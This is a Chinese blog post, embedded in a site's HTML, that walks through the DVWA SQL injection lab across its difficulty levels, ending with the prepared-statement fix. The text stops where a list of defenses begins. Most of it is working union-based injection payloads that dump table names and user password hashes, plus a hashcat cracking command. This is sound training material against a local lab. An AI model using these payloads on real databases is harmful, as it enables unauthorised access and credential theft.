@@ -1,0 +1,772 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="LYM">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SQL Inject中文叫做SQL注入，是发生在web端的安全漏洞，主要是实现非法操作，例如欺骗服务器执行非法查询，属于注入攻击的一种   简单来说就是通过web表单把SQL命令提交到数据库，由于管理员没有细致的过滤用户输入的数据，造成字符串拼接，进而恶意的SQL语句被执行，造成数据库信息泄露、网页篡改、数据库被恶意操作等后果。  开始SQL Injection分类：  从注入参数类型分类：数字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa-SQL-injection">
+<meta property="og:url" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/index.html">
+<meta property="og:site_name" content="LYM的博客">
+<meta property="og:description" content="SQL Inject中文叫做SQL注入，是发生在web端的安全漏洞，主要是实现非法操作，例如欺骗服务器执行非法查询，属于注入攻击的一种   简单来说就是通过web表单把SQL命令提交到数据库，由于管理员没有细致的过滤用户输入的数据，造成字符串拼接，进而恶意的SQL语句被执行，造成数据库信息泄露、网页篡改、数据库被恶意操作等后果。  开始SQL Injection分类：  从注入参数类型分类：数字">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692026676570.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692026772071.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692090066161.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692090682710.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692092930950.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692094237026.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692098320586.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692098433045.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692105076889.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692105332882.png">
+<meta property="og:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692105941841.png">
+<meta property="article:published_time" content="2022-06-05T02:10:10.000Z">
+<meta property="article:modified_time" content="2022-06-05T02:10:10.000Z">
+<meta property="article:author" content="LYM">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://blog.lingyuanming.site/2022/06/05/dvwa-SQL-injection/1692026676570.png">
+  
+  
+  
+  <title>dvwa-SQL-injection - LYM的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.lingyuanming.site","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>LYM</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="dvwa-SQL-injection"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        LYM
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-05 10:10" pubdate>
+          2022年6月5日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">dvwa-SQL-injection</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>SQL Inject中文叫做SQL注入，是发生在web端的安全漏洞，主要是实现非法操作，例如欺骗服务器执行非法查询，属于注入攻击的一种</p>
+</blockquote>
+<blockquote>
+<p>简单来说就是通过web表单把SQL命令提交到数据库，由于管理员没有细致的过滤用户输入的数据，造成字符串拼接，进而恶意的SQL语句被执行，造成数据库信息泄露、网页篡改、数据库被恶意操作等后果。</p>
+</blockquote>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>SQL Injection分类：</p>
+<ul>
+<li>从注入参数类型分类：数字型注入、字符型注入、搜索型注入</li>
+<li>从注入方法分：报错注入、布尔盲注、时间盲注、联合查询注入、堆叠注入、内联查询注入、宽字节注入</li>
+<li>从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入</li>
+</ul>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692026676570.png" srcset="/img/loading.gif" lazyload alt="1692026676570"></p>
+<h2 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/vulnerabilities/sqli/?id=1&amp;Submit=Submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=low; PHPSESSID=6058ace1f2f087663ecfbc8858534749<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h2><p>给它输入个 <code>1</code>试试,哎，上钩了！是有回显的。<br><img src="/2022/06/05/dvwa-SQL-injection/1692026772071.png" srcset="/img/loading.gif" lazyload alt="1692026772071"><br>话不多说，直接看题</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>源码太长了，直接贴关键的吧,可以说是没有丝毫过滤，页面回显</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ]<br><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br><span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>        <span class="hljs-comment">// 页面回显</span><br>        <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>        <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br>        <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>假装我们没有看过源码，纯手工一步步来，增加学习印象</p>
+<ol>
+<li>判断注入类型<br>由于输入的数据 id 是数字，我们并不知道服务器将 id 的值认为是字符还是数字，因此我们需要先来判断是数字型注入还是字符型注入(虽然从源码看得出来)。当输入的参数为字符串时就称该 SQL 注入为字符型，当输入的参数为数字时就称该 SQL 注入为数字型。字符型和数字型最大的一个区别在于数字型不需要单引号来闭合，而字符型需要通过单引号来闭合。</li>
+</ol>
+<ul>
+<li>输入 <code>1‘</code>   ，出现回显 <code>Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code><br>说明是<strong>字符型注入</strong></li>
+</ul>
+<ol start="2">
+<li>判断回显列数（”#”在SQL中表示行内注释）</li>
+</ol>
+<ul>
+<li>联合查询，依次输入 <code>1&#39; union select 1#</code>  <code>1&#39; union select 1，2#</code>  <code>1&#39; union select 1#</code><br>查看回显，发现只有 <code>1&#39; union select 1,2#</code>回显正常,说明回显只有两个字段。说明还可以<strong>联合注入</strong></li>
+</ul>
+<ol start="3">
+<li>获取其他信息</li>
+</ol>
+<ul>
+<li>查询数据库名。输入 <code>1&#39; union SELECT DATABASE(),VERSION()#</code></li>
+</ul>
+<p><img src="/2022/06/05/dvwa-SQL-injection/1692090066161.png" srcset="/img/loading.gif" lazyload alt="1692090066161"><br><code>当前数据库</code>为 <code>dvwa</code>，<br><code>数据库版本</code>为 <code>10.11.4-MariaDB</code><br>MariaDB是MySQL的一个分支，完全兼容，并且版本号大于5.0,就能利用 <code>information_schema</code>数据库查询更多信息</p>
+<ul>
+<li>查询表名。输入 <code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#39;dvwa&#39;#</code> “group_concat()”函数返回一个字符串结果，该结果由分组中的值连接组合而成。</li>
+</ul>
+<p><img src="/2022/06/05/dvwa-SQL-injection/1692090682710.png" srcset="/img/loading.gif" lazyload alt="1692090682710"><br><code>dvwa</code>数据库有2张表 <code>guestbook</code>  <code>users</code></p>
+<ul>
+<li>查询字段(列名)。输入 <code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39; #</code><br><img src="/2022/06/05/dvwa-SQL-injection/1692092930950.png" srcset="/img/loading.gif" lazyload alt="1692092930950"><br>字段为 <code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code></li>
+<li>查询用户名密码。输入 <code>&#39;union select group_concat(user separator &quot;\n&quot;),group_concat(password separator &quot;\n&quot;) from users #</code><br><img src="/2022/06/05/dvwa-SQL-injection/1692094237026.png" srcset="/img/loading.gif" lazyload alt="1692094237026"><br>看到密码并非是明文，32位字符16个字节，考虑是md5值</li>
+<li>解密admin的密码 <code>5f4dcc3b5aa765d61d8327deb882cf99</code><ol>
+<li>md5在线网站</li>
+<li>kali命令字典爆破 <code>hashcat -a 0 -m 0  5f4dcc3b5aa765d61d8327deb882cf99  /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt</code></li>
+</ol>
+</li>
+</ul>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="请求页面-1"><a href="#请求页面-1" class="headerlink" title="请求页面"></a>请求页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692098320586.png" srcset="/img/loading.gif" lazyload alt="1692098320586"></p>
+<h2 id="http请求-1"><a href="#http请求-1" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/sqli/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:4280<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=medium; PHPSESSID=6058ace1f2f087663ecfbc8858534749<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-ini"><span class="hljs-attr">id</span>=<span class="hljs-number">1</span>&amp;Submit=Submit</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="响应页面-1"><a href="#响应页面-1" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692098433045.png" srcset="/img/loading.gif" lazyload alt="1692098433045"></p>
+<h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>源码如下，源码使用了 mysql_real_escape_string() 函数转义字符串中的特殊字符。也就是说特殊符号 \x00、\n、\r、\、’、” 和 \x1a 都将进行转义。同时开发者把前端页面的输入框删了，改成了下拉选择表单，希望以此来控制用户的输入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];<br><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);<br><br><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;<br><br><span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>                <span class="hljs-comment">// Get values</span><br>                <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>                <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br><br>                <span class="hljs-comment">// Feedback for end user</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>            &#125; <br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>POST请求 ，我们用Burp抓包处理</p>
+<ol>
+<li>判断注入类型。可以知道是<strong>数字型注入</strong></li>
+<li>判断回显。同样是回显2列</li>
+<li>获取其他信息。（跟low级别一样，不过注入语句需要去掉单引号）</li>
+</ol>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="请求页面-2"><a href="#请求页面-2" class="headerlink" title="请求页面"></a>请求页面</h2><p>点击 <code>here to chang you ID</code>,会弹框，索性一块整上<br><img src="/2022/06/05/dvwa-SQL-injection/1692105076889.png" srcset="/img/loading.gif" lazyload alt="1692105076889"></p>
+<h2 id="http请求-2"><a href="#http请求-2" class="headerlink" title="http请求"></a>http请求</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/sqli/session-input.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:4280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:4280<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:4280/vulnerabilities/sqli/session-input.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=18803c9408dc8d6e81a36d2e36a00d63; security=high<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">id</span>=<span class="hljs-number">1</span>&amp;Submit=Submit</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="响应页面-2"><a href="#响应页面-2" class="headerlink" title="响应页面"></a>响应页面</h2><p><img src="/2022/06/05/dvwa-SQL-injection/1692105332882.png" srcset="/img/loading.gif" lazyload alt="1692105332882"></p>
+<h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><p>只是在low的级别后面进行了 <code>LIMIT 1</code>限制回显个数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>; <br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>直接复用low级别的注入语句的话，我看也没什么问题，因为“#”直接注释掉了“LIMIT 1”，试一下真的是一样<br><img src="/2022/06/05/dvwa-SQL-injection/1692105941841.png" srcset="/img/loading.gif" lazyload alt="1692105941841"></p>
+<hr>
+<p>值得注意的是，这里查询内容提交和结果显示使用不同页面显示的防御功能，需要特别提到的是，这样做是为了防止注入工具例如 sqlmap 注入。因为 sqlmap 在注入过程中无法在查询提交页面上获取查询的结果，因此收不到任何反馈，也就没办法进一步注入。但是，这种情况在Firefox上是的，但是在Chrome内核的浏览器不是。在Edge、Chrome上页面提交和页面显示还是在同一个页面上。</p>
+<hr>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<br>               <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span> );<br>               <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>               <span class="hljs-variable">$row</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>           <br></code></pre></td></tr></table></figure>
+
+<p>Impossible 级别的代码采用了 PDO 技术，防止代码和查询数据的混杂。实现了查询语句中的数据与命令相分离。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SQL 注入攻击就是 Web 程序对用户的输入没有进行合法性判断，从而攻击者可以从前端向后端传入攻击参数，并且该参数被带入了后端执行。在很多情况下开发者会使用动态的 SQL 语句，这种语句是在程序执行过程中构造的，不过动态的 SQL 语句很容易被攻击者传入的参数改变其原本的功能。<br>当我们进行手工 SQL 注入时，往往是采取以下几个步骤：</p>
+<ol>
+<li>判断是否存在注入，注入是字符型还是数字型</li>
+<li>猜解SQL查询语句中的字段数；</li>
+<li>获取当前数据库；</li>
+<li>获取数据库中的表；</li>
+<li>获取表中的字段名；</li>
+</ol>
+<p>当开发者需要防御 SQL 注入攻击时，可以采用以下方法。</p>
+<ol>
